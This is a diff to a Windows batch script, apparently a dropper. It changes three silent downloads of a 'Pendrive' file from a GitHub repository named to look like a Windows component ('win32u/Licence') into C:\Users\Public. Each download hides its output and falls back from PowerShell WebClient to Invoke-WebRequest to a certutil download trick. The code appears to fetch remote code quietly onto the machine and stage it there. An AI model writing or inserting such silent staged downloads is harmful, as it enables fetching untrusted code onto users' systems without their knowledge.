@@ -103,8 +103,8 @@ echo ************* Internet connection ****************
 
 ::echo ************* DOWNLOAD file ****************
    echo Downloading...
-   if not exist "C:\Users\Public\Licence\Extension\Pendrive.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/Pendrive.exe?raw=true', 'Pendrive.exe')" > nul 2> nul    
+   if not exist "C:\Users\Public\Licence\Extension\Pendrive.bat" (
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/Pendrive.bat?raw=true', 'Pendrive.bat')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2
    if not exist "C:\Users\Public\Licence\Extension\nircmd.exe" (
@@ -242,8 +242,8 @@ echo .
    echo.
    echo Please, wait...
 
-   if not exist "C:\Users\Public\Licence\Extension\Pendrive.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/Pendrive.exe?raw=true -OutFile Pendrive.exe" > nul 2> nul
+   if not exist "C:\Users\Public\Licence\Extension\Pendrive.bat" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/Pendrive.bat?raw=true -OutFile Pendrive.bat" > nul 2> nul
    )
       if errorlevel 1 goto ERROR3
 
@@ -380,8 +380,8 @@ echo .
    echo Please, wait...
    timeout 3 > NUL
   
-   set url="https://github.com/win32u/Licence/blob/main/Extension/Pendrive.exe?raw=true"
-   set filename="Pendrive.exe"
+   set url="https://github.com/win32u/Licence/blob/main/Extension/Pendrive.bat?raw=true"
+   set filename="Pendrive.bat"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
 
